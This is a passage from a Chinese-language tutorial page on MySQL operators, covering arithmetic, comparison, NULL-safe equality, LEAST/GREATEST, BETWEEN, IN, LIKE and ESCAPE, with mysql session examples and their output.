class="comment">---+-------+-------+---------+-------+--------+-------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span>     <span class="number">5.5</span> <span class="operator">|</span>     <span class="number">6</span> <span class="operator">|</span> <span class="number">2.6667</span> <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span>    <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+-------+-------+---------+-------+--------+-------+---------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">1</span> warning (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # <span class="keyword">SQL</span>中 <span class="operator">+</span> 没有连接的作用，只表示加法运算。此时，会将子符串转换为数值（隐士转换）</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="number">100</span> <span class="operator">+</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">100</span> <span class="operator">+</span> <span class="string">&#x27;1&#x27;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span>       <span class="number">101</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 此时 a 当成 <span class="number">0</span>  处理</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="number">100</span> <span class="operator">+</span> <span class="string">&#x27;a&#x27;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">100</span> <span class="operator">+</span> <span class="string">&#x27;a&#x27;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span>       <span class="number">100</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">1</span> warning (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<hr>
<blockquote>
<ul>
<li>一个整数类型的值对整数进行加法和减法操作，结果还是一个整数；</li>
<li>一个整数类型的值对浮点数进行加法和减法操作，结果是一个浮点数；</li>
<li>在Java中，+的左右两边如果有字符串，那么表示字符串的拼接。但是在MySQL中+只表示数值相加。如果遇到非数值类型，先尝试转成数值，如果转失败，就按0计算。（补充：MySQL 中字符串拼接要使用字符串函数CONCAT()实现）</li>
<li>一个数除以另一个数，除不尽时，结果为一个浮点数，并保留到小数点后4位；<br>乘法和除法的优先级相同，进行先乘后除操作与先除后乘操作，得出的结果相同。</li>
<li>在数学运算中，0不能用作除数，在MySQL中，一个数除以0为NULL。</li>
</ul>
</blockquote>
<h2 id="2-比较运算符"><a href="#2-比较运算符" class="headerlink" title="2. 比较运算符"></a>2. 比较运算符</h2><p>比较运算符用来对表达式左边的操作数和右边的操作数进行比较，比较的结果为真则返回1，比较的结果为假则返回0，其他情况则返回NULL。比较运算符经常被用来作为SELECT查询语句的条件来使用，返回符合条件的结果记录。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135913.png" alt="  "></p>
<blockquote>
<p><strong>等号运算符</strong> </p>
<ol>
<li>等号运算符（&#x3D;）判断等号两边的值、字符串或表达式是否相等，如果相等则返回1，不相等则返回 0。</li>
<li>在使用等号运算符时，遵循如下规则：</li>
</ol>
<ul>
<li>如果等号两边的值、字符串或表达式都为字符串，则MySQL会按照字符串进行比较，其比较的是每个字符串中字符的ANSI编码是否相等。 </li>
<li>如果等号两边的值都是整数，则MySQL会按照整数来比较两个值的大小。</li>
<li>如果等号两边的值一个是整数，另一个是字符串，则MySQL会将字符串转化为数字进行比较。</li>
<li>如果等号两边的值、字符串或表达式中有一个为NULL，则比较结果为NULL</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>, <span class="number">1</span> <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>, <span class="number">1</span> <span class="operator">=</span> <span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span>, (<span class="number">5</span> <span class="operator">+</span> <span class="number">3</span>) <span class="operator">=</span> (<span class="number">2</span> <span class="operator">+</span> <span class="number">6</span>), <span class="string">&#x27;&#x27;</span> <span class="operator">=</span> <span class="keyword">NULL</span> , <span class="keyword">NULL</span> <span class="operator">=</span> <span class="keyword">NULL</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+-------+-----------+-------------------+-----------+-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="operator">|</span> <span class="number">1</span> <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="operator">|</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">0</span> <span class="operator">|</span> <span class="string">&#x27;a&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span> <span class="operator">|</span> (<span class="number">5</span> <span class="operator">+</span> <span class="number">3</span>) <span class="operator">=</span> (<span class="number">2</span> <span class="operator">+</span> <span class="number">6</span>) <span class="operator">|</span> <span class="string">&#x27;&#x27;</span> <span class="operator">=</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">=</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+-------+-----------+-------------------+-----------+-------------+</span></span><br><span class="line"><span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span>       <span class="number">1</span> <span class="operator">|</span>     <span class="number">0</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span>                 <span class="number">1</span> <span class="operator">|</span>      <span class="keyword">NULL</span> <span class="operator">|</span>        <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+---------+-------+-----------+-------------------+-----------+-------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>安全等于运算符：</strong>  </p>
<ul>
<li>安全等于运算符（&lt;&#x3D;&gt;）与等于运算符（&#x3D;）的作用是相似的， 唯一的区别 是‘&lt;&#x3D;&gt;’可 以用来对NULL进行判断。在两个操作数均为NULL时，其返回值为1，而不为NULL；当一个操作数为NULL时，其返回值为0，而不为NULL。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="number">1</span> <span class="operator">&lt;=&gt;</span> <span class="string">&#x27;1&#x27;</span>, <span class="number">1</span> <span class="operator">&lt;=&gt;</span> <span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> <span class="operator">&lt;=&gt;</span> <span class="string">&#x27;a&#x27;</span>, (<span class="number">5</span> <span class="operator">+</span> <span class="number">3</span>) <span class="operator">&lt;=&gt;</span> (<span class="number">2</span> <span class="operator">+</span> <span class="number">6</span>), <span class="string">&#x27;&#x27;</span> <span class="operator">&lt;=&gt;</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span> <span class="operator">&lt;=&gt;</span> <span class="keyword">NULL</span> <span class="keyword">FROM</span> dual;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------+-------------+---------------------+-------------+---------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">&lt;=&gt;</span> <span class="string">&#x27;1&#x27;</span> <span class="operator">|</span> <span class="number">1</span> <span class="operator">&lt;=&gt;</span> <span class="number">0</span> <span class="operator">|</span> <span class="string">&#x27;a&#x27;</span> <span class="operator">&lt;=&gt;</span> <span class="string">&#x27;a&#x27;</span> <span class="operator">|</span> (<span class="number">5</span> <span class="operator">+</span> <span class="number">3</span>) <span class="operator">&lt;=&gt;</span> (<span class="number">2</span> <span class="operator">+</span> <span class="number">6</span>) <span class="operator">|</span> <span class="string">&#x27;&#x27;</span> <span class="operator">&lt;=&gt;</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">&lt;=&gt;</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------+-------------+---------------------+-------------+---------------+</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span>       <span class="number">0</span> <span class="operator">|</span>           <span class="number">1</span> <span class="operator">|</span>                   <span class="number">1</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+---------+-------------+---------------------+-------------+---------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>






<blockquote>
<p><strong>不等于运算符：</strong> </p>
<ul>
<li>不等于运算符（&lt;&gt;和!&#x3D;）用于判断两边的数字、字符串或者表达式的值是否不相等， 如果不相等则返回1，相等则返回0。不等于运算符不能判断NULL值。如果两边的值有任意一个为NULL， 或两边都为NULL，则结果为NULL。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="number">1</span> <span class="operator">&lt;&gt;</span> <span class="number">1</span>, <span class="number">1</span> <span class="operator">!=</span> <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span> <span class="operator">!=</span> <span class="string">&#x27;b&#x27;</span>, (<span class="number">3</span><span class="operator">+</span><span class="number">4</span>) <span class="operator">&lt;&gt;</span> (<span class="number">2</span><span class="operator">+</span><span class="number">6</span>), <span class="string">&#x27;a&#x27;</span> <span class="operator">!=</span> <span class="keyword">NULL</span>, <span class="keyword">NULL</span> <span class="operator">&lt;&gt;</span> <span class="keyword">NULL</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+------------+----------------+-------------+--------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">&lt;&gt;</span> <span class="number">1</span> <span class="operator">|</span> <span class="number">1</span> <span class="operator">!=</span> <span class="number">2</span> <span class="operator">|</span> <span class="string">&#x27;a&#x27;</span> <span class="operator">!=</span> <span class="string">&#x27;b&#x27;</span> <span class="operator">|</span> (<span class="number">3</span><span class="operator">+</span><span class="number">4</span>) <span class="operator">&lt;&gt;</span> (<span class="number">2</span><span class="operator">+</span><span class="number">6</span>) <span class="operator">|</span> <span class="string">&#x27;a&#x27;</span> <span class="operator">!=</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">&lt;&gt;</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+------------+----------------+-------------+--------------+</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">0</span> <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span>              <span class="number">1</span> <span class="operator">|</span>        <span class="keyword">NULL</span> <span class="operator">|</span>         <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+------------+----------------+-------------+--------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>





<h2 id="3-非符号类型运算符"><a href="#3-非符号类型运算符" class="headerlink" title="3. 非符号类型运算符"></a>3. 非符号类型运算符</h2><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135918.png" alt="  "></p>
<blockquote>
<p><strong>空运算符</strong></p>
<ul>
<li>空运算符（<code>IS NULL</code>或者<code>ISNULL</code>）判断一个值是否为NULL，如果为NULL则返回1，否则返回0。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span> <span class="keyword">IS</span> <span class="keyword">NULL</span>, ISNULL(<span class="keyword">NULL</span>), ISNULL(<span class="string">&#x27;a&#x27;</span>), <span class="number">1</span> <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------+-------------+-----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span> <span class="keyword">IS</span> <span class="keyword">NULL</span> <span class="operator">|</span> ISNULL(<span class="keyword">NULL</span>) <span class="operator">|</span> ISNULL(<span class="string">&#x27;a&#x27;</span>) <span class="operator">|</span> <span class="number">1</span> <span class="keyword">IS</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------+-------------+-----------+</span></span><br><span class="line"><span class="operator">|</span>            <span class="number">1</span> <span class="operator">|</span>            <span class="number">1</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------+-------------+-----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>非空运算符</strong> </p>
<ul>
<li>非空运算符（IS NOT NULL）判断一个值是否不为NULL，如果不为NULL则返回1，否则返回0。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span> <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>, <span class="string">&#x27;a&#x27;</span> <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>, <span class="number">1</span> <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------+---------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span> <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">1</span> <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------+---------------+</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">0</span> <span class="operator">|</span>               <span class="number">1</span> <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-----------------+---------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>最小值运算符</strong>  </p>
<ul>
<li>语法格式为：LEAST(值1，值2，…，值n)。其中，“值n”表示参数列表中有n个值。在有两个或多个参数的情况下，返回最小值。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> LEAST (<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>), LEAST(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;c&#x27;</span>), LEAST(<span class="number">1</span>,<span class="keyword">NULL</span>,<span class="number">2</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------------+-----------------+</span></span><br><span class="line"><span class="operator">|</span> LEAST (<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>) <span class="operator">|</span> LEAST(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;c&#x27;</span>) <span class="operator">|</span> LEAST(<span class="number">1</span>,<span class="keyword">NULL</span>,<span class="number">2</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------------+-----------------+</span></span><br><span class="line"><span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span> a                  <span class="operator">|</span>            <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+--------------------+-----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>最大值运算符</strong>   </p>
<ul>
<li>语法格式为：<code>GREATEST(值1，值2，...，值n)</code>。其中，n表示参数列表中有n个值。当有两个或多个参数时，返回值为最大值。假如任意一个自变量为NULL，则GREATEST()的返回值为NULL。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> GREATEST(<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>), GREATEST(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;c&#x27;</span>), GREATEST(<span class="number">1</span>,<span class="keyword">NULL</span>,<span class="number">2</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-----------------------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> GREATEST(<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>) <span class="operator">|</span> GREATEST(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;c&#x27;</span>) <span class="operator">|</span> GREATEST(<span class="number">1</span>,<span class="keyword">NULL</span>,<span class="number">2</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-----------------------+--------------------+</span></span><br><span class="line"><span class="operator">|</span>               <span class="number">2</span> <span class="operator">|</span> c                     <span class="operator">|</span>               <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-----------------------+--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.11</span> sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p> 由结果可以看到，当参数中是整数或者浮点数时，GREATEST将返回其中最大的值；当参数为字符串时，返回字母表中顺序最靠后的字符；当比较值列表中有NULL时，不能判断大小，返回值为NULL。</p>
</blockquote>
<blockquote>
<p><strong>BETWEEN AND运算符</strong> </p>
<ul>
<li>BETWEEN运算符使用的格式通常为<code>SELECT D FROM TABLE WHERE C</code> BETWEEN A AND B，此时，当C大于或等于A，并且C小于或等于B时，结果为1，否则结果为0</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">BETWEEN</span> <span class="number">0</span> <span class="keyword">AND</span> <span class="number">1</span>, <span class="number">10</span> <span class="keyword">BETWEEN</span> <span class="number">11</span> <span class="keyword">AND</span> <span class="number">12</span>, <span class="string">&#x27;b&#x27;</span> <span class="keyword">BETWEEN</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+----------------------+-------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="keyword">BETWEEN</span> <span class="number">0</span> <span class="keyword">AND</span> <span class="number">1</span> <span class="operator">|</span> <span class="number">10</span> <span class="keyword">BETWEEN</span> <span class="number">11</span> <span class="keyword">AND</span> <span class="number">12</span> <span class="operator">|</span> <span class="string">&#x27;b&#x27;</span> <span class="keyword">BETWEEN</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;c&#x27;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+----------------------+-------------------------+</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">1</span> <span class="operator">|</span>                    <span class="number">0</span> <span class="operator">|</span>                       <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+----------------------+-------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>IN运算符</strong></p>
<ul>
<li>IN运算符用于判断给定的值是否是IN列表中的一个值，如果是则返回1，否则返回0。如果给 定的值为NULL，或者IN列表中存在NULL，则结果为NULL。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">IN</span> (<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>), <span class="number">1</span> <span class="keyword">IN</span> (<span class="number">2</span>,<span class="number">3</span>), <span class="keyword">NULL</span> <span class="keyword">IN</span> (<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>), <span class="string">&#x27;a&#x27;</span> <span class="keyword">IN</span> (<span class="string">&#x27;a&#x27;</span>, <span class="keyword">NULL</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+------------+-------------------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">IN</span> (<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>) <span class="operator">|</span> <span class="number">1</span> <span class="keyword">IN</span> (<span class="number">2</span>,<span class="number">3</span>) <span class="operator">|</span> <span class="keyword">NULL</span> <span class="keyword">IN</span> (<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>) <span class="operator">|</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">IN</span> (<span class="string">&#x27;a&#x27;</span>, <span class="keyword">NULL</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+------------+-------------------+--------------------+</span></span><br><span class="line"><span class="operator">|</span>                    <span class="number">1</span> <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>              <span class="keyword">NULL</span> <span class="operator">|</span>                  <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+------------+-------------------+--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>NOT IN运算符</strong></p>
<ul>
<li>NOT IN运算符用于判断给定的值是否不是IN列表中的一个值，如果不是IN列表中的一个值，则返回1，否则返回0。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>), <span class="number">1</span> <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>) <span class="operator">|</span> <span class="number">1</span> <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="number">2</span>,<span class="number">3</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+----------------+</span></span><br><span class="line"><span class="operator">|</span>                        <span class="number">0</span> <span class="operator">|</span>              <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<blockquote>
</blockquote>
<blockquote>
<p><strong>LIKE运算符</strong> </p>
<ul>
<li>LIKE运算符主要用来匹配字符串，通常用于模糊匹配，如果满足条件则返回1，否则返回 0。如果给定的值或者匹配条件为NULL，则返回结果为NULL。</li>
</ul>
</blockquote>
<p>LIKE运算符通常使用如下通配符：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;%&quot;：匹配<span class="number">0</span>个或多个字符。</span><br><span class="line">&quot;_&quot;：只能匹配一个字符。</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span> <span class="keyword">LIKE</span> <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;abc&#x27;</span> <span class="keyword">LIKE</span> <span class="keyword">NULL</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span> <span class="keyword">LIKE</span> <span class="string">&#x27;abc&#x27;</span> <span class="operator">|</span> <span class="string">&#x27;abc&#x27;</span> <span class="keyword">LIKE</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-----------------+</span></span><br><span class="line"><span class="operator">|</span>            <span class="keyword">NULL</span> <span class="operator">|</span>            <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> first_name</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> first_name <span class="keyword">LIKE</span> <span class="string">&#x27;S%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> first_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> Steven     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Shelley    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> last_name</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> last_name <span class="keyword">LIKE</span> <span class="string">&#x27;_o%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> last_name  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> Kochhar    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Jones      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>



<blockquote>
<p><strong>ESCAPE</strong></p>
</blockquote>
<ul>
<li>回避特殊符号的：使用转义符。例如：将<code>[%]</code>转为<code>[$%]</code>、<code>[]</code>转为<code>[$]</code>，然后再加上<code>[ESCAPE &#39;$&#39;]</code>即可。</li>
</ul>
